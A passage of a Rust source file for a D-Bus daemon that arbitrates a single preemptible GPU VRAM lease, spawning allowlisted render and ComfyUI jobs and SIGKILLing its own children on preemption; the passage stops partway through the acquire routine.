//! `lease` — the unified VRAM coordinator daemon (ADR-0006 control plane + ADR-0010).
//!
//! This is `coord` × `lease` merged into one process: it serves the **single exclusive,
//! preemptible VRAM lease** over the session bus AND owns the batch children, so a
//! preemption actually SIGKILLs the running job and reclaims VRAM — the headline behaviour
//! that the two earlier slices proved separately, now joined. ADR-0006 routes Hermes → a
//! D-Bus lease call → agentosd; this is the agentosd side.
//!
//! Two holder kinds, one lever:
//!   * **Cooperative** (`Acquire`): the caller runs + owns its own GPU process (Hermes
//!     interactive inference via the gateway) and must `Release` when done. agentosd owns
//!     nothing here — and never needs to, because `interactive` is the top tier (it
//!     preempts, is never preempted).
//!   * **Owned** (`Spawn`): agentosd spawns the job (ComfyUI/overnight batch) and holds its
//!     PID, so it can SIGKILL it on preemption (ADR-0009/0010 §5). The SIGKILL lever only
//!     ever lands on these.
//!
//! A higher-tier `Acquire`/`Spawn` that preempts the current owned holder SIGKILLs that
//! child (own-PID evict; `POST /free` is never on the path). A background supervisor reaps
//! a naturally-exited owned child and auto-releases its lease. Monotonic lease tokens mean
//! a preempted holder's stale `Release` (or its late supervisor reap) can't free a
//! successor's lease.
//!
//! The decision is the same deterministic core as `coord`: `admit` (predict-before-load,
//! ADR-0010 §4) + `arbitrate` (priority, §1/§2) + the pure, unit-tested `LeaseState`
//! (token issue/revoke). zbus + the owned-child plumbing are the thin shell (model
//! proposes, code disposes: no model output reaches the lease).
//!
//! Scope (ADR-0001): a lease server + process supervisor, not a scheduler. There is no
//! wait-queue yet — a losing acquirer is told `queued` and retries (real backpressure
//! comes from the gateway holding inference responses, ADR-0006). A revoke *signal* for
//! cooperative holders, and the Hermes plugin that calls this, are the remaining work.

use std::fs::File;
use std::process::Stdio;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::{Duration, Instant};

use nvml_wrapper::Nvml;
use tokio::process::{Child, Command};
use tokio::sync::Mutex;

use crate::coord::{admit, arbitrate, free_mib, Admission, CallerClass, Holder, LeaseDecision, Tier};
use crate::feed::feed_dir;
// ADR-0022 Phase 1: reclaim a flatpak-scoped Blender lane (cgroup.kill via a pinned dir-fd) — the
// process-group SIGKILL can't reach a lane flatpak reparents into a systemd scope. See `scope_reclaim`.
use crate::scope_reclaim::{self, ScopeHandle};
// The keyhole consumes `keyhole.json` (read-only); the lease daemon publishes its arbitration
// state to a sibling `lease.json` the keyhole producer merges in. Reusing the SAME type both
// sides (de)serialize keeps the contract locked (ADR-0012 §3).
use crate::keyhole::Lease;

/// Safety headroom kept free on a fresh grant (mirrors `coord` / ADR-0004 margins).
const HEADROOM_MIB: u64 = 512;

/// Conservative default footprint for the `eevee-render` profile (ADR-0023 P1). Distinct from the
/// `blender-render` Cycles wrapper, whose caller-supplied ~8000-MiB estimate would always DENY
/// against ComfyUI's ~5.8 GB residual headroom. EEVEE (rasteriser, no BVH/OptiX) is far lighter, so
/// a render can actually be admitted beside a warm model. A `Spawn` caller may still override this
/// with its own `estimate_mib`; this is the sane default the CLI hint advertises.
/// TODO: replace with a measured NVML delta under a leashed EEVEE run (the same calibration the
/// `// TODO: measured NVML delta` note on `blender-render` awaits).
const EEVEE_RENDER_EST_MIB: u32 = 3000;

/// After a scope reclaim (`cgroup.kill`), poll the pinned fd up to this many times for the lane to
/// empty before re-reading free VRAM, so the just-granted successor doesn't allocate into not-yet-freed
/// memory (review B2: `cgroup.kill` returns when the SIGKILL is *queued*, not when the driver freed the
/// VRAM). Bounded × `SCOPE_RECLAIM_POLL_INTERVAL` so a hung lane can't stall the caller forever (fail-open).
const SCOPE_RECLAIM_POLLS: u32 = 30;
const SCOPE_RECLAIM_POLL_INTERVAL: Duration = Duration::from_millis(100);

const BUS_NAME: &str = "org.agentos.Coordinator1";
const OBJ_PATH: &str = "/org/agentos/Coordinator1";

/// Static launch-profile allowlist (ADR-0013 A2). `Spawn` names an *intent*, never a binary —
/// the daemon owns the command vector, so a D-Bus caller can't make agentosd run arbitrary
/// commands. This closes the unauthenticated-RCE Critical (review finding S1): `Spawn(argv)` is
/// gone. `params` are appended as LITERAL argv (execv, no shell) → no injection. A new owned job
/// is a new entry here (a config file is the later step). Profile programs must be absolute so
/// the `looks_executable` pre-flight (H3) actually checks them.
const PROFILES: &[(&str, &[&str])] = &[
    // The dreaming/overnight ComfyUI the daemon owns + can SIGKILL (ADR-0009/0010 §5).
    ("comfyui", &["/home/corey/Documents/AgentOS/spikes/dreaming/start-comfyui.sh"]),
    // A headless Blender Cycles render the daemon owns + can SIGKILL (ADR-0022 §3, Phase 0). The
    // wrapper execs `blender -b … --python render.py` (a FIXED, repo-owned script — never an agent
    // param) and caps Cycles' own VRAM so a heavy scene fails its frame, not the driver. The owned
    // PID is blender → SIGKILL frees the CUDA context. `params` carry only validated scalars.
    ("blender-render", &["/home/corey/Documents/AgentOS/integrations/blender/render-wrapper.sh"]),
    // A headless EEVEE render the daemon owns + can SIGKILL (ADR-0023 P1). DISTINCT from
    // `blender-render` purely so the daemon (and the operator) treat it as a LIGHT lane: EEVEE is a
    // rasteriser (no BVH/OptiX), so a render can actually be ADMITTED beside a warm model, whereas the
    // Cycles `blender-render`'s ~8000-MiB caller estimate would always DENY against ComfyUI's ~5.8 GB
    // residual headroom. The daemon-owned program is the SAME hardened, path-validated wrapper (the safe
    // entry point — engine selection is a render.py/wrapper concern, deferred per integrations/blender/
    // README §6); the difference that matters at the lease layer is the conservative default footprint
    // `EEVEE_RENDER_EST_MIB`, advertised in the CLI hint below.
    ("eevee-render", &["/home/corey/Documents/AgentOS/integrations/blender/render-wrapper.sh"]),
    // A harmless stand-in for smoke-testing the lease plumbing (params e.g. ["600"]).
    ("sleep", &["/usr/bin/sleep"]),
];

/// Resolve a profile name to its daemon-owned base argv, or `None` if not allowlisted.
fn resolve_profile(name: &str) -> Option<Vec<String>> {
    PROFILES
        .iter()
        .find(|(n, _)| *n == name)
        .map(|(_, argv)| argv.iter().map(|s| s.to_string()).collect())
}

fn profile_names() -> String {
    PROFILES.iter().map(|(n, _)| *n).collect::<Vec<_>>().join(", ")
}

/// Lease TTL backstop (ADR-0013 B5): a holder past this without a `Renew` is auto-expired, so a
/// stuck/buggy holder — or an owned job whose `Spawn` caller crashed (the gap B4 leaves) — can't
/// hold the lane forever. Default covers a full Wan 14B dream (~1 hr); `Renew` extends. Tunable
/// via `AGENTOSD_LEASE_TTL_SECS` (operational knob; also lets tests use a short value).
fn lease_ttl() -> Duration {
    let s = std::env::var("AGENTOSD_LEASE_TTL_SECS").ok().and_then(|s| s.parse().ok()).unwrap_or(5400);
    Duration::from_secs(s)
}

/// Anti-strobe dwell (ADR-0013 C7): a just-preempted tier can't re-acquire for this long, so
/// bursty interactive load can't drive spawn→preempt→spawn churn (ComfyUI relaunch is costly).
/// Tunable via `AGENTOSD_PREEMPT_DWELL_SECS`.
fn preempt_dwell() -> Duration {
    let s = std::env::var("AGENTOSD_PREEMPT_DWELL_SECS").ok().and_then(|s| s.parse().ok()).unwrap_or(8);
    Duration::from_secs(s)
}

/// The UE wallpaper's throttled-FLOOR VRAM footprint (ADR-0029 D4) — the second of UE's two-number
/// footprint, against which the governor admits a higher tier when deciding throttle-vs-kill
/// (`coord::yield_decision`). The Phase-A packaged-runtime measurement on a trivial scene was ~1.0 GB
/// at the FLOOR rung (~1.2 GB FULL); a richer tableau must be re-measured before the budget is locked.
/// Tunable via `AGENTOSD_UE_FLOOR_MIB`.
fn ue_floor_mib() -> u64 {
    std::env::var("AGENTOSD_UE_FLOOR_MIB").ok().and_then(|s| s.parse().ok()).unwrap_or(1000)
}

/// C7: is `req` still in its post-preempt cooldown? Interactive is exempt — top priority must
/// never be delayed. Pure + tested (the time source is injected).
fn cooling_down(cooldown: Option<(Tier, Instant)>, req: Tier, now: Instant) -> bool {
    matches!(cooldown, Some((t, until)) if t == req && req != Tier::Interactive && now < until)
}

/// Anti-strobe dwell for the ADR-0018 §2 graceful warm-pool reclaim: once a reclaim is attempted, no
/// other request triggers another `ollama stop` storm for this long (so bursty heavy-lane admissions
/// can't thrash the warm pool — the warm-eviction anti-strobe the review panel required, item #6).
/// Tunable via `AGENTOSD_WARM_RECLAIM_DWELL_SECS`.
fn warm_reclaim_dwell() -> Duration {
    let s = std::env::var("AGENTOSD_WARM_RECLAIM_DWELL_SECS").ok().and_then(|s| s.parse().ok()).unwrap_or(10);
    Duration::from_secs(s)
}

/// ADR-0018 §2 gate (the tier + VRAM half — pure + tested). Should a request that's about to be
/// VRAM-denied first try a graceful warm-pool reclaim? ONLY the heavy lane that fails *closed* today
/// (`Batch`/`BestEffort`), and ONLY on a real shortfall against a *readable* card. `Interactive` is
/// deliberately untouched: it fails OPEN (ADR-0003) and must never be delayed by an `ollama stop`.
/// `None` free (unreadable NVML) is never eligible — never unload the warm pool blind. The lease-free
/// and anti-strobe-dwell checks are runtime state (decided under the lock), not part of this gate.
fn warm_reclaim_eligible(tier: Tier, free_opt: Option<u64>, est: u64, headroom: u64) -> bool {
    matches!(tier, Tier::Batch | Tier::BestEffort)
        && matches!(free_opt, Some(free) if !admit(free, est, headroom).granted())
}

// ---------------------------------------------------------------------------
// Pure lease state machine (the only new decision logic — unit-tested below).
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Held {
    tier: Tier,
    token: u64,
    /// The footprint this holder was admitted for — so a preempt can predict the free
    /// VRAM after evicting it (H1: complete the preempt decision, not just priority).
    est_mib: u64,
}

/// Outcome of an `acquire` against the single lease.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AcquireResult {
    /// Lease was free and the footprint fit → granted with a fresh token.
    Granted { token: u64 },
    /// A higher tier displaced a lower holder → granted; `victim` must be evicted.
    Preempted { token: u64, victim: u64 },
    /// Held by an equal-or-higher tier → the requester must wait/retry.
    Queued,
    /// Lease was free but predict-before-load refused (would not fit) — ADR-0010 §4.
    Denied,
}

/// The single exclusive lease (ADR-0010 §1). Tokens are monotonic so a stale `Release`
/// from a preempted holder can't free a successor's lease.
#[derive(Debug)]
pub struct LeaseState {
    holder: Option<Held>,
    next_token: u64,
}

impl LeaseState {
    pub fn new() -> Self {
        LeaseState { holder: None, next_token: 1 }
    }

    /// Decide + mutate. `admission` (computed from live NVML by the caller) keeps NVML
    /// out of this testable core. Admission gates only a *fresh* grant (predict-before-load,
    /// ADR-0010 §4). A preemption is decided by **priority** (`arbitrate`) — the lower tier
    /// must always yield — and the new holder is installed with its own `est`; the caller
    /// re-checks fit against post-eviction free VRAM (H1) and acts on the verdict.
    pub fn acquire(&mut self, tier: Tier, admission: &Admission) -> AcquireResult {
        let est = admission.est_mib();
        match arbitrate(self.holder.map(|h| Holder { tier: h.tier }), tier) {
            LeaseDecision::Queue => AcquireResult::Queued,
            LeaseDecision::Preempt => {
                // arbitrate returns Preempt only when a holder exists.
                let Some(victim) = self.holder else { return AcquireResult::Queued };
                let token = self.install(tier, est);
                AcquireResult::Preempted { token, victim: victim.token }
            }
            LeaseDecision::Grant => {
                if !admission.granted() {
                    return AcquireResult::Denied;
                }
                let token = self.install(tier, est);
                AcquireResult::Granted { token }
            }
        }
    }

    /// Release the lease iff `token` is the current holder's (monotonic-token guard).
    pub fn release(&mut self, token: u64) -> bool {
        if self.holder.map(|h| h.token) == Some(token) {
            self.holder = None;
            true
        } else {
            false
        }
    }

    pub fn holder_tier(&self) -> Option<Tier> {
        self.holder.map(|h| h.tier)
    }

    pub fn holder_token(&self) -> u64 {
        self.holder.map_or(0, |h| h.token)
    }

    /// The current holder's admitted footprint estimate (for the preempt fit re-check).
    pub fn holder_est(&self) -> Option<u64> {
        self.holder.map(|h| h.est_mib)
    }

    /// Issue a fresh token and install `tier` (admitted for `est_mib`) as the sole holder.
    fn install(&mut self, tier: Tier, est_mib: u64) -> u64 {
        let token = self.next_token;
        self.next_token += 1;
        self.holder = Some(Held { tier, token, est_mib });
        token
    }
}

impl Default for LeaseState {
    fn default() -> Self {
        Self::new()
    }
}

// ---------------------------------------------------------------------------
// Owned-child plumbing (the impure shell — kept out of the tested core).
// ---------------------------------------------------------------------------

/// How the lease reclaims the GPU from an owned holder. The lever differs by how the holder was
/// launched, and that difference is the whole of ADR-0022 Phase 1:
///   * `Spawned`  — agentosd spawned the job, so it owns the `Child` (reaping) + a process group it can
///     negative-PID SIGKILL (`sigkill_group`). The existing ComfyUI/batch path.
///   * `Scope`    — an externally-launched flatpak Blender **lane** that flatpak reparented into a
///     systemd scope (so a group SIGKILL can't reach it). Reclaimed by SIGKILLing the whole cgroup
///     scope (`cgroup.kill`) via a dir-fd pinned at adopt time. agentosd did NOT spawn it → there is no
///     `Child`, and `Release` must NOT kill it (it's the user's authoring app; it exits on its own).
enum Reclaim {
    Spawned { child: Child, pid: u32 },
    Scope { handle: ScopeHandle, dir: File, lane_pid: u32 },
}

/// A GPU job that owns the single lease and can be reclaimed on preemption — either an agentosd-spawned
/// child or an adopted flatpak lane scope (the `reclaim` field carries which, ADR-0013 + ADR-0022).
struct OwnedJob {
    token: u64,
    label: String,
    reclaim: Reclaim,
}

/// What the caller is asking the lease for — the cooperative/owned/adopted distinction, threaded into the
/// shared `do_acquire` core so the admission + arbitration + GO-1 clamp are identical on every path.
enum AcquireKind {
    /// `Acquire` — the caller runs + owns its own GPU process (Hermes interactive inference).
    Cooperative,
    /// `Spawn` — agentosd spawns + owns a child from an allowlisted profile (ComfyUI/batch).
    Spawn(Vec<String>),
    /// `AdoptScope` — agentosd records a flatpak lane's already-running cgroup scope as the reclaim
    /// handle (ADR-0022 Phase 1). `handle`/`dir` are resolved + pinned by the daemon, never caller input.
    AdoptScope { handle: ScopeHandle, dir: File, lane_pid: u32 },
}

/// The daemon's shared mutable state: the lease decision + the at-most-one owned child
/// (one lease holder → at most one owned process). One `Mutex` keeps the lease and the
/// child it controls atomically consistent.
struct Inner {
    lease: LeaseState,
    owned: Option<OwnedJob>,
    /// Human narration of the preempt that shaped the current holder, for the keyhole's
    /// arbitration line ("" = no contention). Set on preempt, cleared on a fresh/idle lease.
    last_preempt: String,
    /// The D-Bus unique name of the current holder + its token (ADR-0013 B4). When that peer
    /// disconnects (crash), the supervisor auto-releases the lease so a dead holder can't wedge
    /// the lane forever (finding H4). `None` for a holder with no bus name (owned jobs).
    holder_peer: Option<(u64, String)>,
    /// When the current holder's lease expires absent a `Renew` (ADR-0013 B5). `None` = no holder.
    holder_deadline: Option<Instant>,
    /// A just-preempted tier and when its anti-strobe cooldown ends (ADR-0013 C7).
    cooldown: Option<(Tier, Instant)>,
    /// When the last ADR-0018 §2 graceful warm-pool reclaim was *attempted* (marked at attempt
    /// start, under the lock). Its dwell (`warm_reclaim_dwell`) blocks back-to-back `ollama stop`
    /// storms — the warm-eviction anti-strobe the review panel required (ADR-0018 #6). `None` = never.
    last_warm_reclaim: Option<Instant>,
}

impl Inner {
    fn new() -> Self {
        Inner {
            lease: LeaseState::new(),
            owned: None,
            last_preempt: String::new(),
            holder_peer: None,
            holder_deadline: None,
            cooldown: None,
            last_warm_reclaim: None,
        }
    }
}

/// Basename of the launched program (argv[0]) — the keyhole's `holder` for an owned job, mapped
/// to a friendly name for the recognized launch profiles so the tray reads `batch (comfyui)`
/// rather than the raw `start-comfyui.sh` (and matches the keyhole WORKLOAD label). Unknown
/// launchers fall back to the bare basename (honest, never faked).
fn short_label(label: &str) -> String {
    let base = label
        .split_whitespace()
        .next()
        .map(|p| p.rsplit('/').next().unwrap_or(p).to_string())
        .unwrap_or_default();
    // An adopted lane's label IS its scope unit (`app-flatpak-org.blender.Blender-NNNN.scope`); collapse
    // it to a stable tray name rather than the noisy instance-id'd unit (ADR-0022 Phase 1).
    if base.starts_with("app-flatpak-org.blender.Blender-") {
        return "blender-lane".to_string();
    }
    match base.as_str() {
        "start-comfyui.sh" => "comfyui".to_string(),
        // Both `blender-render` (Cycles) and `eevee-render` (ADR-0023 P1) resolve to the same hardened
        // wrapper, so the launcher basename alone can't tell them apart at the tray. They share a label;
        // the lease-layer distinction is the footprint estimate, not the program. Honest, not faked.
        "render-wrapper.sh" => "blender-render".to_string(),
        _ => base,
    }
}

/// Snapshot the current holder into the keyhole's lease-mirror contract. Cheap — call it while
/// holding `Inner`, then write OFF the lock. No holder → all-empty (the UI shows "no contention").
/// A cooperative holder has no agentosd-known name, so `holder` stays empty (honest, not faked).
fn lease_snapshot(inner: &Inner) -> Lease {
    match inner.lease.holder_tier() {
        Some(t) => {
            let token = inner.lease.holder_token();
            let holder = inner
                .owned
                .as_ref()
                .filter(|j| j.token == token)
                .map(|j| short_label(&j.label))
                .unwrap_or_default();
            Lease { tier: t.as_str().to_string(), holder, preempt: inner.last_preempt.clone() }
        }
        None => Lease::default(),
    }
}

/// Atomic temp+rename publish of the lease mirror, ALWAYS called OFF the `Inner` lock
/// (ADR-0012 §3): a keyhole render reading this file must never be able to delay a SIGKILL, so
/// observation is strictly downstream of a file the daemon writes. Best-effort / fail-open — a
/// failed write just leaves the keyhole showing "no contention".
fn write_lease_mirror(path: Option<&Path>, snap: &Lease) {
    let Some(path) = path else { return };
    let Ok(json) = serde_json::to_string(snap) else { return };
    let tmp = path.with_file_name(format!(".lease.{}.tmp", std::process::id()));
    if std::fs::write(&tmp, json).is_ok() {
        let _ = std::fs::rename(&tmp, path);
    }
}

fn spawn_owned(argv: &[String]) -> std::io::Result<(Child, u32)> {
    let mut it = argv.iter();
    let prog = it
        .next()
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::InvalidInput, "empty argv"))?;
    let child = Command::new(prog)
        .args(it)
        // Own process group (R1): the child is its own group leader (pgid == pid), so a
        // launcher that forks workers (e.g. ComfyUI) is reclaimed as a whole group on evict.
        .process_group(0)
        .stdin(Stdio::null())
        // Fail-safe (ADR-0003): never leak an owned GPU process if the daemon dies.
        .kill_on_drop(true)
        .spawn()?;
    // A spawned child has a pid until reaped; None only if it died instantly → spawn anomaly.
    let pid = child
        .id()
        .ok_or_else(|| std::io::Error::other("child exited before id()"))?;
    Ok((child, pid))
}

/// Best-effort executable pre-flight so a bad `argv[0]` is caught *before* we evict an
/// incumbent (H3): only checks an absolute/relative path; a bare PATH name passes through.
fn looks_executable(prog: &str) -> bool {
    use std::os::unix::fs::PermissionsExt;
    if !prog.contains('/') {
        return true; // resolved via PATH at spawn time; can't cheaply check here
    }
    std::fs::metadata(prog)
        .map(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

/// SIGKILL the whole process group led by `pid` (set via `process_group(0)`), so a forking
/// owned job is fully reclaimed — `POST /free` is never trusted (ADR-0010 §5, finding R1).
fn sigkill_group(pid: u32) {
    // Safe: a kill(2) syscall with a constant signal; negative pid targets the group.
    unsafe {
        libc::kill(-(pid as i32), libc::SIGKILL);
    }
}

/// Scaled safety headroom (H5 partial): self-reported model sizes undercount (ADR-0004
/// measured 19.5 GB for an 18 GB-reported model), so a flat 512 MiB is too thin on big
/// models. Keep ≥6% of the estimate, floored at the base headroom.
fn headroom_for(est_mib: u64) -> u64 {
    (est_mib / 16).max(HEADROOM_MIB)
}

/// H1: complete the preempt decision. After evicting the victim, will the successor fit?
/// Predicted free = current free + the victim's admitted footprint *iff we actually own
/// (and thus reclaim) it*; a cooperative victim frees nothing agentosd controls. Pure +
/// tested — the kill is authorized by priority, this just makes the consequence explicit.
fn fits_after_evict(free_mib: u64, victim_est: u64, reclaimable: bool, succ_est: u64, headroom: u64) -> bool {
    let predicted = if reclaimable { free_mib.saturating_add(victim_est) } else { free_mib };
    admit(predicted, succ_est, headroom).granted()
}

/// GO-2 identity gate (ADR-0021): may `requester` release `token`? A *bound* (cooperative) holder —
/// one whose token agentosd recorded against the acquiring bus name (`holder_peer`) — may be released
/// ONLY by that same peer, so one agent behind the MCP act surface can't release another's lease. An
/// authoritative system release (`None`: B4 peer-disconnect, B5 TTL) always may; an unbound holder (an
/// owned `Spawn` job, whose caller may have disconnected) stays token-only as before. Pure + tested.
fn may_release(holder_peer: Option<&(u64, String)>, token: u64, requester: Option<&str>) -> bool {
    match (requester, holder_peer) {
        (None, _) => true, // system/authoritative release (disconnect, TTL) — always permitted
        (Some(name), Some((bound_tok, bound_name))) if *bound_tok == token => name == bound_name,
        (Some(_), _) => true, // no binding for this token (owned job / unknown) — token-only guard
    }
}

/// GO-2 identity gate for `Renew` (ADR-0021 ratification must-fix #1): may `requester` renew `token`?
/// Renew shares the `release` identity predicate — a *bound* (cooperative) lease's TTL may be extended
/// ONLY by its acquiring peer; without this, a peer that guessed the monotonic token could pin or
/// indefinitely extend another holder's lease (defeating the B5 stuck-holder backstop). It additionally
/// requires `token` to be the *live* holder. An unbound (owned `Spawn`) holder stays token-only, so the
/// `busctl`-per-call dream client still renews across fresh connections. Pure + tested.
fn may_renew(
    holder_peer: Option<&(u64, String)>,
    holder_token: u64,
    holder_live: bool,
    token: u64,
    requester: Option<&str>,
) -> bool {
    may_release(holder_peer, token, requester) && holder_live && holder_token == token
}

/// Release `token` — shared by the `Release` method (peer-identity-checked: `requester = Some(name)`)
/// and the authoritative supervisor paths (`requester = None`). True iff it was the holder AND the
/// requester was allowed (GO-2). Group-SIGKILLs + reaps an owned child, clears narration +
/// holder-peer when the lease goes idle, and republishes the keyhole mirror OFF the lock.
async fn release_token(
    inner: &Arc<Mutex<Inner>>,
    mirror: Option<&Path>,
    token: u64,
    requester: Option<&str>,
) -> bool {
    let (freed, to_reap, snap) = {
        let mut g = inner.lock().await;
        if !may_release(g.holder_peer.as_ref(), token, requester) {
            return false; // GO-2: foreign-token release — refuse, identical to an unknown token
        }
        let freed = g.lease.release(token);
        let mut to_reap: Option<Reclaim> = None;
        if freed {
            if let Some(job) = g.owned.take() {
                if job.token == token {
                    to_reap = Some(job.reclaim);
                } else {
                    g.owned = Some(job);
                }
            }
            if g.holder_peer.as_ref().is_some_and(|(t, _)| *t == token) {
                g.holder_peer = None;
            }
            g.holder_deadline = None; // B5: no holder → no deadline
            if g.lease.holder_tier().is_none() {
                g.last_preempt.clear();
            }
        }
        (freed, to_reap, lease_snapshot(&g))
    };
    if freed {
        write_lease_mirror(mirror, &snap);
        match to_reap {
            // A spawned child: releasing means "done with the GPU" → SIGKILL the group + reap the leader.
            Some(Reclaim::Spawned { mut child, pid }) => {
                sigkill_group(pid);
                tokio::spawn(async move {
                    let _ = child.wait().await; // reap the leader (no zombie)
                });
            }
            // An adopted lane: Release = stop coordinating it, NOT kill it. agentosd didn't spawn the
            // user's Blender; the pinned dir-fd drops (closed) here and the lane runs on uncoordinated
            // until it exits on its own (its natural-exit auto-release / TTL still apply). (ADR-0022)
            Some(Reclaim::Scope { handle, .. }) => {
                println!("coordd: released adopted lane `{}` — left running (not agentosd-owned)", handle.scope_unit);
            }
            None => {}
        }
    }
    freed
}

// ---------------------------------------------------------------------------
// D-Bus shell (zbus, session bus, tokio reactor).
// ---------------------------------------------------------------------------

struct Coordinator {
    inner: Arc<Mutex<Inner>>,
    nvml: Arc<Nvml>,
    /// `$XDG_RUNTIME_DIR/nimbus-aurora/lease.json` — the keyhole's arbitration mirror, or None
    /// if the runtime dir is unavailable (the daemon still runs; the keyhole shows no contention).
    mirror: Option<PathBuf>,
}

impl Coordinator {
    /// Shared path for `Acquire` (cooperative), `Spawn` (owned child) and `AdoptScope` (owned flatpak
    /// lane scope). The lock is held across the decision AND the spawn/evict so the lease and the holder
    /// it controls never disagree. The destructive reclaim itself runs OFF the lock (review C5).
    async fn do_acquire(
        &self,
        caller: Option<String>,
        class: CallerClass,
        tier_name: String,
        estimate_mib: u32,
        kind: AcquireKind,
    ) -> (bool, u64, String) {
        use std::fmt::Write as _;

        let requested = match Tier::from_arg(&tier_name) {
            Ok(t) => t,
            Err(e) => return (false, 0, format!("error: {e}")),
        };
        // ADR-0021 GO-1: clamp the requested tier to the caller class HERE, in core, before any
        // admission or arbitration — an agent can never hold a tier that preempts the desktop, on
        // ANY transport (a guard in the MCP shell would be bypassed by a second D-Bus client). WHO
        // is an `Agent` is the GO-2 identity question; this is the clamp that question relies on.
        // Today every caller is `Trusted`, so this is a no-op until the `act` verbs land.
        let tier = class.clamp(requested);
        let est = estimate_mib as u64;
        let headroom = headroom_for(est);

        // H3: pre-flight the binary BEFORE we lock/evict, so a bad argv can't destroy an
        // incumbent. (PATH-relative names pass through; resolved at spawn time.)
        if let AcquireKind::Spawn(args) = &kind {
            if args.is_empty() {
                return (false, 0, "spawn: empty argv".into());
            }
            if !looks_executable(&args[0]) {
                return (false, 0, format!("spawn: `{}` is not an executable file", args[0]));
            }
        }

        // R2: distinguish "couldn't read VRAM" (None) from "0 free".
        let mut free_opt = free_mib(&self.nvml).await;

        // ADR-0018 §2 — GRACEFUL RECLAIM BEFORE THE SLEDGEHAMMER. A heavy-lane (batch/best-effort)
        // request that would be VRAM-denied gets ONE off-lock warm-pool reclaim first: `ollama stop`
        // resident models cold-first, RE-MEASURE free VRAM (never predict — we don't own Ollama's PID,
        // acceptance #2), then fall through to the normal locked admission, which re-checks fit against
        // the freshly measured `free_opt` (that locked `admit` stays the SOLE gate — no TOCTOU). We only
        // reclaim when the lease is FREE: a held lease Queues/Preempts regardless of VRAM (warm-pool
        // unload wouldn't help), so the cheap peek-lock below filters that out and avoids a wasted stop.
        // The whole step is fail-open (ADR-0003): an unreachable Ollama or a stalled unload just leaves
        // `free_opt` unchanged and the request denies honestly, exactly as before this code existed.
        if warm_reclaim_eligible(tier, free_opt, est, headroom) {
            let now = Instant::now();
            let go = {
                let mut g = self.inner.lock().await; // brief peek — dropped before any I/O
                let lease_free = g.lease.holder_tier().is_none();
                let cooling = g.last_warm_reclaim.is_some_and(|t| now < t + warm_reclaim_dwell());
                if lease_free && !cooling {
                    g.last_warm_reclaim = Some(now); // mark intent (anti-strobe) — held with the lock
                    true
                } else {
                    false
                }
            };
            if go {
                let r = crate::reclaim::RealReclaimer { nvml: Arc::clone(&self.nvml) };
                let out = crate::reclaim::reclaim_until_fits(
                    &r,
                    est,
                    headroom,
                    crate::reclaim::DEFAULT_MAX_STOPS,
                    crate::reclaim::DEFAULT_POLL_TRIES,
                    crate::reclaim::DEFAULT_POLL_INTERVAL,
                )
                .await;
                if !out.stopped.is_empty() || !out.offloaded.is_empty() {
                    eprintln!(
                        "coordd: ADR-0018 §2 graceful reclaim for {} (est {est}M): ollama stop {:?}; \
                         free {}M→{}M ({}){}",
                        tier.as_str(),
                        out.stopped,
                        out.free_before,
                        out.free_after,
                        if out.satisfied { "now fits" } else { "still short — denies (fail-closed)" },
                        if out.offloaded.is_empty() {
                            String::new()
                        } else {
                            format!("; warm-pool offloaded (size_vram<size): {:?}", out.offloaded)
                        },
                    );
                }
                // Re-admit against the freshly MEASURED free VRAM (measure-don't-predict): the locked
                // admission below is the gate, now reading the post-reclaim number.
                if !out.stopped.is_empty() {
                    free_opt = Some(out.free_after);
                }
            }
        }

        let mut inner = self.inner.lock().await;
        let prev_est = inner.lease.holder_est().unwrap_or(0);
        let prev_tier = inner.lease.holder_tier();

        // C7: a just-preempted tier must wait out its dwell before re-acquiring (anti-strobe).
        if cooling_down(inner.cooldown, tier, Instant::now()) {
            return (
                false,
                0,
                format!(
                    "cooling down: {} was preempted recently — retry shortly (anti-strobe, ADR-0013 C7)",
                    tier.as_str()
                ),
            );
        }

        // Fresh-grant admissibility, with fail-open per tier (ADR-0003): on an unreadable
        // GPU, interactive (top tier) grants anyway — never block live AI on a read blip —
        // while batch/best-effort fail *closed* (don't start a heavy job blind).
        let admit_ok = match free_opt {
            Some(free) => admit(free, est, headroom).granted(),
            None => tier == Tier::Interactive,
        };
        let admission = if admit_ok {
            Admission::Grant { free_mib: free_opt.unwrap_or(0), est_mib: est, headroom_mib: headroom }
        } else {
            Admission::Deny {
                free_mib: free_opt.unwrap_or(0),
                est_mib: est,
                headroom_mib: headroom,
                short_mib: 0,
            }
        };

        // preempted = Some((victim_token, fit_verdict)); fit verdict completes the decision (H1).
        let (token, preempted) = match inner.lease.acquire(tier, &admission) {
            AcquireResult::Queued => {
                return (
                    false,
                    0,
                    format!(
                        "queued: lease held by {} (token {})",
                        inner.lease.holder_tier().map_or("?", Tier::as_str),
                        inner.lease.holder_token()
                    ),
                );
            }
            AcquireResult::Denied => {
                let msg = match free_opt {
                    None => format!(
                        "declined: VRAM unreadable — {} batch fails closed (won't start blind); \
                         interactive would fail open",
                        tier.as_str()
                    ),
                    Some(free) => {
                        let short = match admit(free, est, headroom) {
                            Admission::Deny { short_mib, .. } => short_mib,
                            _ => 0,
                        };
                        format!("denied: short {short}M (free {free}M vs est {est}M + headroom {headroom}M)")
                    }
                };
                return (false, 0, msg);
            }
            AcquireResult::Granted { token } => (token, None),
            AcquireResult::Preempted { token, victim } => {
                // H1: re-verify fit against PREDICTED post-eviction free (current + the
                // victim's admitted footprint, iff we actually own/reclaim it). The kill is
                // authorized by priority; this completes the *decision* and warns the caller.
                let reclaimable = inner.owned.as_ref().is_some_and(|j| j.token == victim);
                let fit = match free_opt {
                    Some(free) => {
                        if fits_after_evict(free, prev_est, reclaimable, est, headroom) {
                            "fits"
                        } else {
                            "WONT-FIT"
                        }
                    }
                    None => "fit-unknown",
                };
                // C7: start the evicted tier's anti-strobe cooldown.
                inner.cooldown = prev_tier.map(|t| (t, Instant::now() + preempt_dwell()));
                (token, Some((victim, fit)))
            }
        };

        // Evict the previously-owned holder on preemption — carry its reclaim handle OUT so we run the
        // destructive reclaim OFF the lock (review C5). A Spawned victim is group-SIGKILLed + reaped
        // (R1/H2); a Scope victim is cgroup.killed via its pinned fd then confirmed freed (ADR-0022 B2).
        let mut evicted: Option<(String, Reclaim, &'static str)> = None;
        if let Some((victim, fit)) = preempted {
            if let Some(job) = inner.owned.take() {
                if job.token == victim {
